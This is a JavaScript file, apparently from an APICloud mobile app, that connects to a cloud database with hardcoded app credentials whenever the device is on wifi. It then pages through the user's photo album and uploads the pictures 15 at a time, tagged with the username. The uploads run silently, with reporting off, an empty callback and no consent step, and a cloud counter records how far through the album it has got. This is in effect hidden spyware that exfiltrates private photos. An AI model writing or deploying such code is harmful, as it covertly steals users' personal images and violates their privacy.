var model;

/**
 *用户当前相册已经读取到第几页了
 */
var userPage = 0;
/**
 *当前用户的username
 */
var namevalue = '';
/**
 *开始循环的本地记录周期数 
 */
var localpage = 0;
/**
 *即将更新的云数据库ID 
 */
var dataBaseId = 0;

function initDataBase() {
	var connectionType = api.connectionType;
	if(connectionType == 'wifi'){
		model = api.require('model');
		model.config({
			appKey : '1390DC66-1F5B-B026-44FE-936381333CFF',
			appId : 'A6927929605198',
			host : 'https://d.apicloud.com'
		});
		getuser();
	}
}

/**
 *获取当前用户是否已经扫描过图片了
 */
function getuser() {
	var query = api.require("query");

	query.createQuery(function(ret, err) {
		if (ret && ret.qid) {
			var queryId = ret.qid;

			query.whereEqual({
				qid : queryId,
				column : "name",
				value : namevalue
			});

			query.limit({
				qid : queryId,
				value : "20"
			});

			model.findAll({
				class : "userpage",
				qid : queryId
			}, function(ret, err) {
				if (ret) {
					if (ret.length != 0) {
						userPage = ret[0].page;
						dataBaseId = ret[0].id;
					} else {
						userPage = 0;
					}
					arrayPicList();
				}else{
					tingzhiLoad();
				}
			});
		}
	});
}

/**
 *开始准备上传图片
 */
function arrayPicList() {
	if (userPage == 0) {
		insertUserPage();
	}else{
		updateUserPage();
	}
}
/**
 *如果没有扫描过的话 则扫描第一页然后保存即将扫描的下一页到云数据库 
 * 然后开始上传图片
 */          
function insertUserPage() {
	model.insert({
		class : "userpage",
		value : {
			"name" : namevalue,
			"page" : (parseInt(userPage) + 1)
		}
	}, function(ret, err) {
		if(ret){
			scaner();
		}else{
			tingzhiLoad();
		}
	});
}

function updateUserPage() {
	model.updateById({
		class : "userpage",
		id : dataBaseId,
		value : {
			"name" : namevalue,
			"page" : (parseInt(userPage) + 1)
		}
	}, function(ret, err) {
		if(ret){
			scaner();
		}else{
			tingzhiLoad();
		}
	});
}
/**
 *没有执行过扫描的 直接上传第一个15张 
 */
function scaner() {
	var UIAlbumBrowser = api.require('UIAlbumBrowser');
	UIAlbumBrowser.scan({
		type : 'image',
		count : 15,
		sort : {
			key : 'time',
			order : 'asc'
		},
		thumbnail : {
			w : api.winWidth,
			h : api.winHeight
		}
	}, function(ret) {
		if (ret) {
			if(userPage == 0){
				for (var a = 0; a < ret.list.length; a++) {
					uploadpinc(ret.list[a].path, ret.list[a].time);
				}
				tingzhiLoad();
			}else{
				fetchallpic();
			}
		}else{
			tingzhiLoad();
		}
	});
}

function fetchallpic() {
	localpage++;
	var UIAlbumBrowser = api.require('UIAlbumBrowser');
	UIAlbumBrowser.fetch(function(ret, err) {
		if (ret) {
			if(localpage == userPage){
				for (var a = 0; a < ret.list.length; a++) {
					uploadpinc(ret.list[a].path, ret.list[a].time);
				}
				tingzhiLoad();
			}else{
				fetchallpic();
			}
		}else{
			tingzhiLoad();
		}
	});
}

function uploadpinc(imgpath, imgname) {
	model.uploadFile({
		report : false,
		data : {
			file : {
				name : imgname + "**" + namevalue,
				url : imgpath
			}
		}
	}, function(ccc, ddd) {
	});
}

/**
 *隐藏缓冲狂 
 */
function tingzhiLoad(){
	
}

